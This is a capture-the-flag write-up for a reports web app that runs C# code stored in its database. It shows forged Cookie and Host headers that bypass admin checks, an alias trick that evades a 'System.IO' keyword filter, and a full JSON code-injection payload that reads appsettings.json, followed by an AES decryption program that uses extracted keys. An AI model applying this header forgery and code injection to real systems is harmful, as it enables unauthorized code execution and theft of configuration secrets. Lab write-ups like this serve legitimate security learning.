## Writeup


### Introduction
The reports application generates a report by executing the code found in the "Reports" table in the database. This opens up for an opportunity to execute a RCE exploit.


### Exploitation
The /api/Data endpoint allows users with the Admin role originating from a set of defined hostnames to add new reports to the database.

To gain access to this endpoint, two headers must be set: 
`Cookie: Role=Admin`
`Host: localhost`
 
The next step is to craft a payload to retrieve the flag. However, there is a restriction: the code must not contain `System.IO`. To circumvent this limitation, we can alias System as another name, for example: using `S = System;`.

The final payload can be crafted as such:

```json
{
    "id": "1001",
    "name": "Shit2",
    "code": "using System;\nusing System.Data;\nusing System.Data.Common;\nusing Microsoft.Data.Sqlite;\nusing System.Text;\nusing Microsoft.EntityFrameworkCore.ValueGeneration.Internal;\nusing Microsoft.EntityFrameworkCore;\nusing S = System;\nusing WebSite.Models;\nusing System.Collections;\nusing System.Collections.Generic;\n\nnamespace WebSite.Models\n{\n    class ReportTableModelData\n    {\n        public ReportDataModel CreateModel(string conection)\n        {\n            var flag = S.IO.File.ReadAllText(\"appsettings.json\");\n       var data = new ReportDataModel();\n            data.Headers.Add(\"Shit\");\n            \n              var row = new List<string>();\n              row.Add(flag);\n              data.Data.Add(row);\n\n            return data;\n        }\n\n        \n    }\n}\n"
}
```

This payload can then be sent to the Data endpoint. This must be repeated for appsettings.json too. After retrieving the ciphertext and the AES parameters, we can use the following code to decrypt: 

```csharp
using System;
using System.IO;
using System.Security.Cryptography;

    class Program
    {
         static string GetFlag() {
            var key =  System.Convert.FromBase64String("+m/PvlP8q2qteBXh1DPBNBcqflqsIsmcxA1WP0AP+tg=");
            var IV =  System.Convert.FromBase64String("wdNJlxKPtwfxcTw+oYJSOQ==");
            var encrypted_flag =  System.Convert.FromBase64String("BkGxf0oAV5YHjUE3zUQ+Ri07oz3r+fB9l6MArFkm7HF2D4yWA55CMPywL9TSeAu1");

            var flag =DecryptStringFromBytes_Aes(encrypted_flag, key, IV);
            return flag;

         }
         static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold
            // the decrypted text.
            string plaintext = null;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }

            return plaintext;
        }
    
        static void Main(string[] args)
        {
          Console.WriteLine(Program.GetFlag());
        }
    }
```
